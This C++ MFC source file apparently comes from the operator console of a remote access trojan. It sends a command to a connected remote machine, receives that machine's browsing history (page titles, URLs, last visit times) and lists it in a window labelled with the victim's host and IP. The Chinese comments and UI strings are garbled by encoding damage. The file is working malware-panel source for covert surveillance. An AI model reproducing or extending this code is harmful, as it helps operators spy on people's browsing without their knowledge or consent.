// UrlDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "UrlDlg.h"


extern CString strHost;
// CUrlDlg �Ի���

IMPLEMENT_DYNAMIC(CUrlDlg, CDialog)

CUrlDlg::CUrlDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
    : CDialog(CUrlDlg::IDD, pParent)
{
    m_iocpServer = pIOCPServer;
    m_pContext = pContext;

    m_bOnClose = FALSE;

}


void CUrlDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_LIST_URL, m_list_url);
}


BEGIN_MESSAGE_MAP(CUrlDlg, CDialog)
    ON_WM_CLOSE()
    ON_WM_SIZE()
END_MESSAGE_MAP()


// CUrlDlg ��Ϣ�������
void CUrlDlg::OnReceiveComplete()
{
    switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_XLIST:
        ShowUrlList();
        break;
    default:
        // ���䷢���쳣����
        break;
    }
}


void CUrlDlg::ShowUrlList()
{
    m_list_url.DeleteAllItems();

    char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
    char	*strTitle;
    char	*strUrl;
    char    *strTime;
    DWORD	dwOffset = 0;

    int i;
    for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++) {
        strTitle = lpBuffer + dwOffset;
        strUrl = strTitle + lstrlen(strTitle) +1;
        strTime = strUrl + lstrlen(strUrl) + 1;

        m_list_url.InsertItem(i, strTitle,0);
        m_list_url.SetItemText(i, 1, strUrl);
        m_list_url.SetItemText(i, 2, strTime);

        dwOffset += lstrlen(strTitle) + lstrlen(strUrl) + lstrlen(strTime) + 3;
    }
}


void CUrlDlg::GetUrlList()
{
    BYTE bToken = COMMAND_XLIST;
    m_iocpServer->Send(m_pContext, &bToken, 1);
}


BOOL CUrlDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO:  �ڴ���Ӷ���ĳ�ʼ��

    CString str;
    sockaddr_in  sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));
    int nSockAddrLen = sizeof(sockAddr);
    BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
    //	str.Format("������� \\\\%s", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
    str.Format(_T("[%s - %s]  ��ҳ��¼"), strHost,bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
    SetWindowText(str);

// 	HWND hWndHeader = m_list_url.GetDlgItem(0)->GetSafeHwnd();
// 	m_header.SubclassWindow(hWndHeader);

    m_list_url.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
    m_list_url.InsertColumn(0, _T("����"), LVCFMT_LEFT, 200);
    m_list_url.InsertColumn(1, _T("��ַ"), LVCFMT_LEFT, 430);
    m_list_url.InsertColumn(2,_T("�ϴη���ʱ��"),LVCFMT_LEFT,150);

    ShowUrlList();
    return TRUE;  // return TRUE unless you set the focus to a control
    // �쳣: OCX ����ҳӦ���� FALSE
}

void CUrlDlg::OnClose()
{
    // TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
    closesocket(m_pContext->m_Socket);

    m_bOnClose = TRUE;

    CDialog::OnClose();
}

void CUrlDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: �ڴ˴������Ϣ����������
    if (!IsWindowVisible())
        return;

    RECT	rectClient;
    RECT	rectlist;
    GetClientRect(&rectClient);
    rectlist.left = 0;
    rectlist.top = 0;
    rectlist.right = rectClient.right;
    rectlist.bottom = rectClient.bottom;
    m_list_url.MoveWindow(&rectlist);
}

void CUrlDlg::PostNcDestroy()
{
    // TODO: �ڴ����ר�ô����/����û���
    if(!m_bOnClose)
        OnClose();

    delete this;

    CDialog::PostNcDestroy();
}

BOOL CUrlDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: �ڴ����ר�ô����/����û���
    if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)) {
        return true;
    }

    return CDialog::PreTranslateMessage(pMsg);
}
